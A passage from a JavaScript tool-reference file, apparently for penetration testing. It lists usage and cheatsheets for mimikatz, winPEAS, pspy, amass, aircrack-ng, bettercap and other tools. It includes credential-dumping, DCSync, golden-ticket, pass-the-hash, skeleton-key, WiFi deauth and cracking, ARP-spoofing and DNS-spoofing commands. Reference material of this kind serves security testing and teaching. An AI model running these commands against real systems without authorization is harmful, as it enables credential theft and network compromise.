      { flag: "log=<file>", desc: "Log output to file" },
      { flag: "servicesinfo", desc: "Only services check" },
      { flag: "eventsinfo", desc: "Only events check" },
      { flag: "userinfo", desc: "Only user info check" },
      { flag: "systeminfo", desc: "Only system info check" },
      { flag: "procesinfo", desc: "Only process info check" }
    ],
    output_format: "Color-coded terminal output. Red = critical, yellow = important, green = interesting.",
    cheatsheet: [
      "winPEASx64.exe > C:\\temp\\winpeas.txt 2>&1",
      "winPEASx64.exe quiet fast",
      "winPEASx64.exe servicesinfo",
      "# Common escalation vectors winpeas finds:",
      "# - Unquoted service paths",
      "# - Writable service binaries",
      "# - AlwaysInstallElevated",
      "# - Stored credentials (cmdkey /list)",
      "# - AutoLogon passwords in registry",
      "# - Scheduled tasks with writable scripts",
      "# - SeImpersonatePrivilege (Potato attacks)"
    ],
    related_tools: ["linpeas", "seatbelt", "sharpup"]
  },

  {
    name: "pspy",
    category: "privesc",
    description: "Unprivileged Linux process snooping tool. Monitors processes without root permissions by scanning /proc. Detects cron jobs, scripts, and commands run by other users including root. Essential for finding scheduled tasks that run as root with exploitable scripts.",
    website: "https://github.com/DominicBreuker/pspy",
    install: "Download from https://github.com/DominicBreuker/pspy/releases (pspy64 or pspy32)",
    basic_usage: [
      { cmd: "./pspy64", desc: "Monitor processes (64-bit)" },
      { cmd: "./pspy32", desc: "Monitor processes (32-bit)" },
      { cmd: "./pspy64 -pf -i 1000", desc: "Monitor processes and files every 1 second" },
      { cmd: "./pspy64 | tee pspy_output.txt", desc: "Save output" }
    ],
    advanced_usage: [
      { cmd: "./pspy64 -r /etc/cron.d -r /var/spool/cron", desc: "Watch specific directories for changes" },
      { cmd: "./pspy64 -c -f", desc: "Color output with file events" },
      { cmd: "./pspy64 -i 500", desc: "Faster polling interval (500ms)" }
    ],
    common_flags: [
      { flag: "-p", desc: "Enable process scanning" },
      { flag: "-f", desc: "Enable file system event scanning" },
      { flag: "-i", desc: "Scan interval in milliseconds (default 100)" },
      { flag: "-r", desc: "Directory to watch for file events (can use multiple)" },
      { flag: "-c", desc: "Color output" },
      { flag: "--debug", desc: "Debug output" }
    ],
    output_format: "Timestamped process events with PID, UID, and command line. Color-coded by UID (root=red).",
    cheatsheet: [
      "./pspy64 -pf -i 1000 | tee /tmp/pspy.txt",
      "./pspy64 -c -f -r /tmp -r /opt",
      "# Look for: UID=0 (root) running scripts you can modify",
      "# Look for: cron jobs executing writable files",
      "# Look for: scripts reading from writable directories"
    ],
    related_tools: ["linpeas", "linux-exploit-suggester"]
  },

  // ============================================================================
  // POST-EXPLOITATION TOOLS
  // ============================================================================

  {
    name: "mimikatz",
    category: "post-exploitation",
    description: "Windows credential extraction tool. Extracts plaintext passwords, NTLM hashes, Kerberos tickets, and PIN codes from memory. Supports pass-the-hash, pass-the-ticket, overpass-the-hash, golden/silver ticket attacks, DCSync, and skeleton key injection. The most essential Windows post-exploitation tool.",
    website: "https://github.com/gentilkiwi/mimikatz",
    install: "Download from GitHub releases (mimikatz_trunk.zip)",
    basic_usage: [
      { cmd: "mimikatz # privilege::debug", desc: "Enable debug privilege" },
      { cmd: "mimikatz # sekurlsa::logonpasswords", desc: "Dump all credentials from memory" },
      { cmd: "mimikatz # sekurlsa::wdigest", desc: "Dump WDigest plaintext passwords" },
      { cmd: "mimikatz # lsadump::sam", desc: "Dump SAM database" },
      { cmd: "mimikatz # lsadump::secrets", desc: "Dump LSA secrets" },
      { cmd: "mimikatz # lsadump::cache", desc: "Dump cached domain logons" }
    ],
    advanced_usage: [
      { cmd: "mimikatz # lsadump::dcsync /user:DOMAIN\\Administrator", desc: "DCSync attack — dump domain admin hash" },
      { cmd: "mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt", desc: "Golden ticket" },
      { cmd: "mimikatz # kerberos::ptt ticket.kirbi", desc: "Pass the ticket" },
      { cmd: "mimikatz # sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH", desc: "Pass the hash (overpass-the-hash)" },
      { cmd: "mimikatz # misc::skeleton", desc: "Skeleton key (backdoor all accounts with 'mimikatz' password)" },
      { cmd: "mimikatz # token::elevate", desc: "Impersonate SYSTEM token" },
      { cmd: "mimikatz # vault::cred", desc: "Dump Windows Vault credentials" },
      { cmd: "mimikatz # dpapi::chrome /in:'Login Data' /unprotect", desc: "Decrypt Chrome passwords" }
    ],
    common_flags: [
      { flag: "privilege::debug", desc: "Get debug privilege (required for most commands)" },
      { flag: "sekurlsa::logonpasswords", desc: "Dump all credentials from LSASS" },
      { flag: "sekurlsa::wdigest", desc: "Dump WDigest credentials" },
      { flag: "sekurlsa::kerberos", desc: "Dump Kerberos credentials" },
      { flag: "sekurlsa::pth", desc: "Pass the hash" },
      { flag: "lsadump::sam", desc: "Dump SAM hashes" },
      { flag: "lsadump::dcsync", desc: "DCSync: replicate DC data (needs replication rights)" },
      { flag: "lsadump::secrets", desc: "Dump LSA secrets" },
      { flag: "kerberos::golden", desc: "Create golden ticket" },
      { flag: "kerberos::silver", desc: "Create silver ticket" },
      { flag: "kerberos::ptt", desc: "Pass the ticket" },
      { flag: "kerberos::list", desc: "List Kerberos tickets" },
      { flag: "kerberos::purge", desc: "Purge Kerberos tickets" },
      { flag: "token::elevate", desc: "Elevate to SYSTEM" },
      { flag: "misc::skeleton", desc: "Inject skeleton key into DC" },
      { flag: "crypto::certificates", desc: "List/export certificates" }
    ],
    output_format: "Interactive console with credential output. Can export tickets to .kirbi files.",
    cheatsheet: [
      "privilege::debug",
      "sekurlsa::logonpasswords",
      "lsadump::sam",
      "lsadump::dcsync /user:DOMAIN\\krbtgt",
      "kerberos::golden /user:admin /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt",
      "sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe",
      "lsadump::dcsync /user:DOMAIN\\Administrator",
      "kerberos::list /export",
      "token::elevate",
      "vault::cred",
      "misc::skeleton"
    ],
    related_tools: ["rubeus", "impacket", "crackmapexec"]
  },

  // ============================================================================
  // OSINT TOOLS
  // ============================================================================

  {
    name: "amass",
    category: "osint",
    description: "OWASP Amass — in-depth attack surface mapping and asset discovery. Performs DNS enumeration, subdomain discovery, ASN enumeration, certificate transparency log mining, web archiving, brute forcing, and more. The most comprehensive subdomain enumeration tool available.",
    website: "https://github.com/owasp-amass/amass",
    install: "go install github.com/owasp-amass/amass/v4/...@master",
    basic_usage: [
      { cmd: "amass enum -d target.com", desc: "Passive subdomain enumeration" },
      { cmd: "amass enum -d target.com -active", desc: "Active + passive enumeration" },
      { cmd: "amass enum -d target.com -brute", desc: "Include brute force" },
      { cmd: "amass intel -d target.com -whois", desc: "Discover related domains via WHOIS" },
      { cmd: "amass enum -d target.com -o subs.txt", desc: "Save results to file" }
    ],
    advanced_usage: [
      { cmd: "amass enum -d target.com -active -brute -w wordlist.txt -rf resolvers.txt -o full_enum.txt", desc: "Full enumeration with custom resolvers" },
      { cmd: "amass intel -org 'Target Corp' -max-dns-queries 20000", desc: "Discover domains by organization" },
      { cmd: "amass enum -d target.com -config amass_config.ini", desc: "Use config with API keys" },
      { cmd: "amass viz -d target.com -maltego", desc: "Export graph for Maltego" },
      { cmd: "amass db -names -d target.com", desc: "Query local database for previous results" }
    ],
    common_flags: [
      { flag: "enum", desc: "Subdomain enumeration mode" },
      { flag: "intel", desc: "Intelligence gathering mode" },
      { flag: "viz", desc: "Visualization mode" },
      { flag: "db", desc: "Database query mode" },
      { flag: "-d", desc: "Target domain(s)" },
      { flag: "-active", desc: "Enable active recon (DNS zone transfers, brute force)" },
      { flag: "-brute", desc: "Enable DNS brute forcing" },
      { flag: "-w", desc: "Wordlist for brute forcing" },
      { flag: "-rf", desc: "File of DNS resolvers" },
      { flag: "-o", desc: "Output file" },
      { flag: "-json", desc: "JSON output file" },
      { flag: "-config", desc: "Configuration file (for API keys)" },
      { flag: "-max-dns-queries", desc: "Maximum DNS queries per minute" },
      { flag: "-timeout", desc: "Minutes before enumeration times out" },
      { flag: "-src", desc: "Show data sources for each result" }
    ],
    output_format: "One subdomain per line. Supports JSON with full record details. Graph database for visualization.",
    cheatsheet: [
      "amass enum -d target.com -src -o subs.txt",
      "amass enum -d target.com -active -brute -w subdomains-top1million.txt",
      "amass intel -d target.com -whois",
      "amass intel -org 'Target Corp'",
      "amass enum -d target.com -json results.json",
      "cat subs.txt | httpx -sc -title -tech-detect"
    ],
    related_tools: ["subfinder", "assetfinder", "theHarvester"]
  },

  {
    name: "subfinder",
    category: "osint",
    description: "Fast passive subdomain discovery tool from ProjectDiscovery. Uses various passive sources (search engines, certificate transparency, DNS datasets, API services) to find subdomains without sending traffic to the target. Designed for speed and integration into recon pipelines.",
    website: "https://github.com/projectdiscovery/subfinder",
    install: "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    basic_usage: [
      { cmd: "subfinder -d target.com", desc: "Find subdomains" },
      { cmd: "subfinder -d target.com -o subs.txt", desc: "Save to file" },
      { cmd: "subfinder -dL domains.txt", desc: "Multiple domains from file" },
      { cmd: "subfinder -d target.com -silent", desc: "Silent mode (only results)" },
      { cmd: "subfinder -d target.com -v", desc: "Verbose mode with sources" }
    ],
    advanced_usage: [
      { cmd: "subfinder -d target.com -all -recursive", desc: "All sources + recursive" },
      { cmd: "subfinder -d target.com -rL resolvers.txt", desc: "Custom DNS resolvers" },
      { cmd: "subfinder -d target.com -json -o results.json", desc: "JSON output with metadata" },
      { cmd: "subfinder -d target.com | httpx -sc -title | nuclei -t cves/", desc: "Full pipeline" },
      { cmd: "subfinder -d target.com -config provider-config.yaml", desc: "With API key configuration" }
    ],
    common_flags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "-dL", desc: "File containing domains" },
      { flag: "-o", desc: "Output file" },
      { flag: "-oJ / -json", desc: "JSON output" },
      { flag: "-all", desc: "Use all sources" },
      { flag: "-recursive", desc: "Recursive subdomain discovery" },
      { flag: "-silent", desc: "Show only results (no banner)" },
      { flag: "-v", desc: "Verbose (show source for each result)" },
      { flag: "-t", desc: "Number of concurrent goroutines" },
      { flag: "-rL", desc: "File containing DNS resolvers" },
      { flag: "-timeout", desc: "Timeout in seconds" },
      { flag: "-config", desc: "Provider configuration file" },
      { flag: "-nW", desc: "Remove wildcard subdomains" },
      { flag: "-cs", desc: "Show source for each result" }
    ],
    output_format: "One subdomain per line. JSON with host, source, and input fields.",
    cheatsheet: [
      "subfinder -d target.com -silent | sort -u",
      "subfinder -d target.com -all -o subs.txt",
      "subfinder -d target.com -silent | httpx -sc -title",
      "subfinder -d target.com -json -o subs.json",
      "subfinder -dL targets.txt -all -o all_subs.txt"
    ],
    related_tools: ["amass", "assetfinder", "httpx"]
  },

  {
    name: "theHarvester",
    category: "osint",
    description: "E-mail, subdomain, and people name harvester. Gathers information from public sources like search engines, PGP key servers, and the Shodan computer database. Useful for the early stages of a penetration test to understand the external threat landscape.",
    website: "https://github.com/laramies/theHarvester",
    install: "sudo apt install theharvester  # or pip install theHarvester",
    basic_usage: [
      { cmd: "theHarvester -d target.com -b google", desc: "Search Google for emails/subdomains" },
      { cmd: "theHarvester -d target.com -b all", desc: "Search all available sources" },
      { cmd: "theHarvester -d target.com -b linkedin", desc: "LinkedIn employee names" },
      { cmd: "theHarvester -d target.com -l 500 -b bing", desc: "Bing search, 500 results limit" },
      { cmd: "theHarvester -d target.com -b crtsh", desc: "Certificate transparency" }
    ],
    advanced_usage: [
      { cmd: "theHarvester -d target.com -b all -f report", desc: "Save HTML/XML report" },
      { cmd: "theHarvester -d target.com -b all -v -n", desc: "Verbose + DNS brute force" },
      { cmd: "theHarvester -d target.com -b shodan -c api_keys.yaml", desc: "With Shodan API key" },
      { cmd: "theHarvester -d target.com -b all --screenshot /tmp/screenshots", desc: "Take screenshots of found hosts" }
    ],
    common_flags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "-b", desc: "Data source (google, bing, linkedin, crtsh, shodan, virustotal, all)" },
      { flag: "-l", desc: "Limit number of results" },
      { flag: "-S", desc: "Start result number" },
      { flag: "-f", desc: "Output file (creates HTML and XML)" },
      { flag: "-n", desc: "Enable DNS brute force" },
      { flag: "-v", desc: "Verify hostnames via DNS" },
      { flag: "-c", desc: "API keys config file" },
      { flag: "--screenshot", desc: "Take screenshots of discovered hosts" },
      { flag: "-t", desc: "DNS TLD expansion" }
    ],
    output_format: "Console output with emails, hosts, and IPs listed. HTML and XML report files.",
    cheatsheet: [
      "theHarvester -d target.com -b all -l 1000",
      "theHarvester -d target.com -b google,bing,crtsh",
      "theHarvester -d target.com -b linkedin",
      "theHarvester -d target.com -b all -f target_report",
      "theHarvester -d target.com -b shodan -v"
    ],
    related_tools: ["amass", "subfinder", "recon-ng"]
  },

  // ============================================================================
  // FORENSICS TOOLS
  // ============================================================================

  {
    name: "volatility3",
    category: "forensics",
    description: "Advanced memory forensics framework. Analyzes RAM dumps to extract running processes, network connections, registry hives, loaded DLLs, command history, injected code, and more. Version 3 is a complete rewrite in Python 3 with improved performance and extensibility.",
    website: "https://github.com/volatilityfoundation/volatility3",
    install: "pip install volatility3",
    basic_usage: [
      { cmd: "vol -f memory.dmp windows.info", desc: "System information from Windows memory" },
      { cmd: "vol -f memory.dmp windows.pslist", desc: "List running processes" },
      { cmd: "vol -f memory.dmp windows.pstree", desc: "Process tree (parent-child)" },
      { cmd: "vol -f memory.dmp windows.netscan", desc: "Network connections" },
      { cmd: "vol -f memory.dmp windows.filescan", desc: "Scan for file objects" },
      { cmd: "vol -f memory.dmp linux.bash", desc: "Bash history from Linux memory" }
    ],
    advanced_usage: [
      { cmd: "vol -f memory.dmp windows.malfind", desc: "Find injected code / malware" },
      { cmd: "vol -f memory.dmp windows.hashdump", desc: "Dump password hashes" },
      { cmd: "vol -f memory.dmp windows.registry.hivelist", desc: "List registry hives" },
      { cmd: "vol -f memory.dmp windows.cmdline", desc: "Process command lines" },
      { cmd: "vol -f memory.dmp windows.dlllist --pid 1234", desc: "DLLs loaded by specific process" },
      { cmd: "vol -f memory.dmp windows.memmap --pid 1234 --dump", desc: "Dump process memory" },
      { cmd: "vol -f memory.dmp windows.vadinfo --pid 1234", desc: "Virtual address descriptor info" },
      { cmd: "vol -f memory.dmp windows.handles --pid 1234", desc: "Open handles for process" },
      { cmd: "vol -f memory.dmp timeliner.Timeliner", desc: "Create timeline of events" }
    ],
    common_flags: [
      { flag: "-f", desc: "Path to memory dump file" },
      { flag: "--pid", desc: "Filter by process ID" },
      { flag: "--dump", desc: "Extract/dump files or memory" },
      { flag: "-o", desc: "Output directory for dumped files" },
      { flag: "--single", desc: "Force single-pass processing" },
      { flag: "-r", desc: "Renderer (pretty, json, csv, jsonl)" }
    ],
    output_format: "Tabular output (TreeGrid). Supports JSON, CSV, and JSONL renderers.",
    cheatsheet: [
      "vol -f dump.dmp windows.pslist",
      "vol -f dump.dmp windows.pstree",
      "vol -f dump.dmp windows.netscan",
      "vol -f dump.dmp windows.malfind",
      "vol -f dump.dmp windows.hashdump",
      "vol -f dump.dmp windows.cmdline",
      "vol -f dump.dmp windows.filescan | grep -i 'password\\|secret'",
      "vol -f dump.dmp windows.dumpfiles --physaddr OFFSET",
      "vol -f dump.dmp windows.registry.printkey --key 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
      "vol -f dump.dmp linux.pslist",
      "vol -f dump.dmp linux.bash"
    ],
    related_tools: ["autopsy", "sleuthkit", "strings"]
  },

  {
    name: "binwalk",
    category: "forensics",
    description: "Firmware analysis tool. Scans binary files for embedded files and executable code. Extracts file systems, compressed archives, and other data from firmware images. Supports entropy analysis to identify encrypted or compressed regions.",
    website: "https://github.com/ReFirmLabs/binwalk",
    install: "sudo apt install binwalk",
    basic_usage: [
      { cmd: "binwalk firmware.bin", desc: "Scan for embedded files/data" },
      { cmd: "binwalk -e firmware.bin", desc: "Extract discovered files" },
      { cmd: "binwalk -Me firmware.bin", desc: "Recursive extraction" },
      { cmd: "binwalk -E firmware.bin", desc: "Entropy analysis" },
      { cmd: "binwalk -A firmware.bin", desc: "Scan for executable code" }
    ],
    advanced_usage: [
      { cmd: "binwalk -Me --run-as=root firmware.bin", desc: "Extract with root (for device files)" },
      { cmd: "binwalk -E -J firmware.bin", desc: "Entropy plot saved as PNG" },
      { cmd: "binwalk --dd='.*' firmware.bin", desc: "Extract everything regardless of type" },
      { cmd: "binwalk -R '\\x89PNG' firmware.bin", desc: "Search for raw bytes (PNG magic)" }
    ],
    common_flags: [
      { flag: "-e", desc: "Extract files" },
      { flag: "-M", desc: "Recursive extraction" },
      { flag: "-E", desc: "Entropy analysis" },
      { flag: "-A", desc: "Scan for executable opcodes" },
      { flag: "-R", desc: "Search for raw byte sequence" },
      { flag: "-J", desc: "Save entropy plot as PNG" },
      { flag: "-D / --dd", desc: "Extract files matching type:extension:command" },
      { flag: "-C", desc: "Output directory" },
      { flag: "--run-as", desc: "Run extraction as specified user" },
      { flag: "-W", desc: "Hexdump comparison of multiple files" }
    ],
    output_format: "Scan results with offset, description, and size. Extracted files in _firmware.bin.extracted/ directory.",
    cheatsheet: [
      "binwalk firmware.bin",
      "binwalk -Me firmware.bin",
      "binwalk -E firmware.bin",
      "binwalk -A firmware.bin",
      "binwalk --dd='elf unix path:elf' firmware.bin",
      "strings firmware.bin | grep -i 'password\\|admin\\|root'",
      "find _firmware.bin.extracted/ -name '*.conf' -o -name 'passwd' -o -name 'shadow'"
    ],
    related_tools: ["foremost", "exiftool", "strings"]
  },

  {
    name: "exiftool",
    category: "forensics",
    description: "Read, write, and edit meta information in a wide variety of files including JPEG, PNG, PDF, MP4, and Office documents. Extracts EXIF, IPTC, XMP, GPS coordinates, camera information, timestamps, software used, and hidden metadata. Essential for OSINT and forensics.",
    website: "https://exiftool.org",
    install: "sudo apt install libimage-exiftool-perl",
    basic_usage: [
      { cmd: "exiftool image.jpg", desc: "Show all metadata" },
      { cmd: "exiftool -gps* image.jpg", desc: "Extract GPS coordinates" },
      { cmd: "exiftool document.pdf", desc: "PDF metadata" },
      { cmd: "exiftool -r /path/to/directory", desc: "Recursive on directory" },
      { cmd: "exiftool -all= image.jpg", desc: "Strip all metadata" }
    ],
    advanced_usage: [
      { cmd: "exiftool -csv *.jpg > metadata.csv", desc: "Export all EXIF to CSV" },
      { cmd: "exiftool -json image.jpg | jq '.[] | .GPSLatitude, .GPSLongitude'", desc: "JSON output with GPS" },
      { cmd: "exiftool -ee document.docx", desc: "Extract embedded images from Office docs" },
      { cmd: "exiftool -b -ThumbnailImage image.jpg > thumb.jpg", desc: "Extract embedded thumbnail" },
      { cmd: "exiftool '-FileName<DateTimeOriginal' -d '%Y%m%d_%H%M%S.%%e' *.jpg", desc: "Rename files by date" }
    ],
    common_flags: [
      { flag: "-r", desc: "Recursive directory processing" },
      { flag: "-all=", desc: "Remove all metadata" },
      { flag: "-gps*", desc: "Show GPS-related tags" },
      { flag: "-csv", desc: "CSV output" },
      { flag: "-json", desc: "JSON output" },
      { flag: "-b", desc: "Binary output (for extracting images)" },
      { flag: "-ee", desc: "Extract embedded files" },
      { flag: "-d", desc: "Date format string" },
      { flag: "-overwrite_original", desc: "Don't create backup files" },
      { flag: "-ext", desc: "Process only files with this extension" }
    ],
    output_format: "Tag: Value pairs. Supports JSON, CSV, XML, HTML output.",
    cheatsheet: [
      "exiftool image.jpg",
      "exiftool -gps* -n image.jpg",
      "exiftool -all= -overwrite_original image.jpg",
      "exiftool -r -csv *.jpg > all_metadata.csv",
      "exiftool -json document.pdf",
      "exiftool -b -ThumbnailImage photo.jpg > thumb.jpg",
      "exiftool -Comment -Author -Creator document.docx",
      "exiftool -r -ext jpg -gps:all= /path/to/photos/"
    ],
    related_tools: ["strings", "foremost", "binwalk"]
  },

  // ============================================================================
  // WIRELESS TOOLS
  // ============================================================================

  {
    name: "aircrack-ng",
    category: "wireless",
    description: "Complete suite of tools for WiFi network security assessment. Includes packet capture (airodump-ng), deauthentication attacks (aireplay-ng), fake access points (airbase-ng), and WEP/WPA/WPA2 cracking (aircrack-ng). The most widely used wireless security toolset.",
    website: "https://www.aircrack-ng.org",
    install: "sudo apt install aircrack-ng",
    basic_usage: [
      { cmd: "airmon-ng start wlan0", desc: "Enable monitor mode" },
      { cmd: "airodump-ng wlan0mon", desc: "Scan for wireless networks" },
      { cmd: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", desc: "Capture on specific channel/BSSID" },
      { cmd: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon", desc: "Send 5 deauth packets" },
      { cmd: "aircrack-ng -w rockyou.txt capture-01.cap", desc: "Crack WPA handshake" },
      { cmd: "airmon-ng stop wlan0mon", desc: "Disable monitor mode" }
    ],
    advanced_usage: [
      { cmd: "aireplay-ng -0 0 -a BSSID -c CLIENT wlan0mon", desc: "Continuous deauth targeting specific client" },
      { cmd: "aireplay-ng -1 0 -e SSID -a BSSID -h MAC wlan0mon", desc: "Fake authentication (for WEP)" },
      { cmd: "aireplay-ng -3 -b BSSID -h MAC wlan0mon", desc: "ARP request replay (for WEP IVs)" },
      { cmd: "aircrack-ng -a2 -w wordlist.txt -b BSSID capture*.cap", desc: "WPA2 crack specific BSSID" },
      { cmd: "airdecap-ng -e SSID -p PASSWORD capture.cap", desc: "Decrypt captured traffic" },
      { cmd: "airbase-ng -e 'Free WiFi' -c 6 wlan0mon", desc: "Create fake access point (evil twin)" },
      { cmd: "hcxdumptool -i wlan0mon -o hash.pcapng --active_beacon --enable_status=15", desc: "Capture PMKID hashes" },
      { cmd: "hcxpcapngtool -o hash.hc22000 hash.pcapng", desc: "Convert to hashcat format" },
      { cmd: "hashcat -m 22000 hash.hc22000 rockyou.txt", desc: "Crack with hashcat" }
    ],
    common_flags: [
      { flag: "airmon-ng start/stop", desc: "Enable/disable monitor mode on interface" },
      { flag: "airodump-ng -c", desc: "Channel to monitor" },
      { flag: "airodump-ng --bssid", desc: "Filter by AP BSSID" },
      { flag: "airodump-ng -w", desc: "Output file prefix" },
      { flag: "airodump-ng --wps", desc: "Show WPS information" },
      { flag: "aireplay-ng -0", desc: "Deauthentication attack (number of packets)" },
      { flag: "aireplay-ng -a", desc: "Access point BSSID" },
      { flag: "aireplay-ng -c", desc: "Client MAC to target" },
      { flag: "aircrack-ng -w", desc: "Wordlist for cracking" },
      { flag: "aircrack-ng -a", desc: "Attack type (1=WEP, 2=WPA)" },
      { flag: "aircrack-ng -b", desc: "Target BSSID" }
    ],
    output_format: "airodump-ng: live table of networks and clients. aircrack-ng: key found/not found with statistics.",
    cheatsheet: [
      "# WPA2 handshake capture and crack:",
      "airmon-ng start wlan0",
      "airodump-ng wlan0mon",
      "airodump-ng -c CHAN --bssid BSSID -w capture wlan0mon",
      "aireplay-ng -0 5 -a BSSID wlan0mon",
      "aircrack-ng -w rockyou.txt capture-01.cap",
      "# PMKID attack (no handshake needed):",
      "hcxdumptool -i wlan0mon -o pmkid.pcapng --active_beacon",
      "hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng",
      "hashcat -m 22000 pmkid.hc22000 rockyou.txt",
      "# Cleanup:",
      "airmon-ng stop wlan0mon"
    ],
    related_tools: ["wifite", "bettercap", "kismet", "hcxdumptool"]
  },

  {
    name: "bettercap",
    category: "wireless",
    description: "Swiss army knife for WiFi, Bluetooth, and network attacks. All-in-one tool for network recon, MITM attacks, WiFi monitoring, BLE device scanning, HTTP/HTTPS proxy, DNS spoofing, and more. Features a built-in web UI and scriptable event system.",
    website: "https://www.bettercap.org",
    install: "sudo apt install bettercap",
    basic_usage: [
      { cmd: "bettercap -iface eth0", desc: "Start on network interface" },
      { cmd: "net.probe on", desc: "Discover hosts on the network" },
      { cmd: "net.show", desc: "Show discovered hosts" },
      { cmd: "wifi.recon on", desc: "Start WiFi monitoring" },
      { cmd: "wifi.show", desc: "Show discovered WiFi networks" },
      { cmd: "ble.recon on", desc: "Start Bluetooth LE scanning" }
    ],
    advanced_usage: [
      { cmd: "set arp.spoof.targets TARGET_IP; arp.spoof on", desc: "ARP spoofing (MITM)" },
      { cmd: "set net.sniff.local true; net.sniff on", desc: "Sniff network traffic" },
      { cmd: "set http.proxy.sslstrip true; http.proxy on", desc: "SSL stripping proxy" },
      { cmd: "set dns.spoof.domains target.com; set dns.spoof.address ATTACKER_IP; dns.spoof on", desc: "DNS spoofing" },
      { cmd: "wifi.deauth BSSID", desc: "Deauth all clients from AP" },
      { cmd: "set wifi.handshakes.file /tmp/hs.pcap; wifi.assoc TARGET_BSSID", desc: "Capture WPA handshake" },
      { cmd: "caplets.show", desc: "List available caplets (automation scripts)" },
      { cmd: "set $ {caplet} http-ui; $ {caplet} http-ui", desc: "Enable web UI" }
    ],
    common_flags: [
      { flag: "-iface", desc: "Network interface" },
      { flag: "-caplet", desc: "Load and run a caplet script" },
      { flag: "-eval", desc: "Run commands at startup" },
      { flag: "-no-colors", desc: "Disable colors" },
      { flag: "-silent", desc: "Suppress banner" },
      { flag: "net.probe on/off", desc: "Active host discovery" },
      { flag: "net.sniff on/off", desc: "Packet sniffing" },
      { flag: "arp.spoof on/off", desc: "ARP spoofing" },
      { flag: "dns.spoof on/off", desc: "DNS spoofing" },
      { flag: "http.proxy on/off", desc: "HTTP proxy" },
      { flag: "wifi.recon on/off", desc: "WiFi reconnaissance" },
      { flag: "wifi.deauth", desc: "WiFi deauthentication" },
      { flag: "ble.recon on/off", desc: "Bluetooth LE scanning" }
    ],
    output_format: "Interactive console with colored output. Web UI available on port 80. Caplet scripting for automation.",
    cheatsheet: [
      "bettercap -iface eth0 -eval 'net.probe on; net.sniff on'",
      "# ARP MITM:",
      "set arp.spoof.targets TARGET; arp.spoof on; net.sniff on",
      "# WiFi deauth:",
      "wifi.recon on; wifi.deauth BSSID",
      "# DNS spoof:",
      "set dns.spoof.domains *.target.com; set dns.spoof.address ATTACKER; dns.spoof on",
      "# BLE scan:",
      "ble.recon on; ble.show"
    ],
    related_tools: ["aircrack-ng", "ettercap", "responder"]
  }

];

// Helper functions
export function getToolsByCategory(category) {
  return TOOL_REFERENCE.filter(t => t.category === category);
}

export function searchTools(query) {
  const q = query.toLowerCase();
  return TOOL_REFERENCE.filter(t =>
    t.name.toLowerCase().includes(q) ||
    t.description.toLowerCase().includes(q) ||
    t.category.toLowerCase().includes(q) ||
    (t.related_tools || []).some(r => r.toLowerCase().includes(q))
  );
}

export function getToolByName(name) {
  return TOOL_REFERENCE.find(t => t.name.toLowerCase() === name.toLowerCase()) || null;
}

export function getAllToolNames() {
  return TOOL_REFERENCE.map(t => t.name);
}

export function getCheatsheet(toolName) {
  const tool = getToolByName(toolName);
  return tool ? tool.cheatsheet : [];
}

export function getToolCount() {
  return TOOL_REFERENCE.length;
}

export function getCategoryCount() {
  const cats = new Set(TOOL_REFERENCE.map(t => t.category));
  return cats.size;
}
